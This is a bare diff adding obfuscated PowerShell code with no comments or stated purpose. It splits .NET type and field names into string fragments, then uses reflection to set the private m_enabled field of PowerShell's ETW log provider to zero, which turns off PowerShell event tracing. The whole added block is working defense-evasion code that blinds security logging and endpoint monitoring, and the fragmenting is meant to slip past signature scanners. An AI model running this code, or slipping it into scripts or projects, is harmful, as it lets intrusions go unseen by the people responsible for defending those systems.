@@ -1,0 +1,12 @@
+$e = 'System'+'.Core'
+$t1 = ('System.Diagn'+'ostics.Eve'+'nting.EventProvider')
+$t2 = ('System.Management.Automation.Tracing.PSEtwLogProvider')
+$f1 = 'm_'+'enabled'
+$f2 = 'etw'+'Provider'
+$b = [Reflection.Assembly]::LoadWithPartialName($e)
+$c = $b.GetType($t1)
+$d = $c.GetField($f1,'NonPublic,Instance')
+$g = [Ref].Assembly.GetType($t2)
+$h = $g.GetField($f2,'NonPublic,Static')
+$i = $h.GetValue($null)
+$d.SetValue($i,0)
